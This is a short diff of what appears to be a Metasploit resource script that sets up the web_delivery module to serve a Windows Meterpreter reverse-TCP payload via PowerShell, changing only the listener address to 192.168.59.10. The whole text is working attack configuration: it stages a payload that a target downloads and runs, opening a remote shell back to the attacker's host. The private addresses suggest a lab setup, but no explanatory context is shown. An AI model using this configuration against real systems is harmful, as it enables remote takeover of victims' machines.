@@ -1,7 +1,7 @@
 use exploit/multi/script/web_delivery 
 set SRVPORT 80
 set URIPATH /psh
-set LHOST 10.0.2.15
+set LHOST 192.168.59.10
 set LPORT 443
 set TARGET 2
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
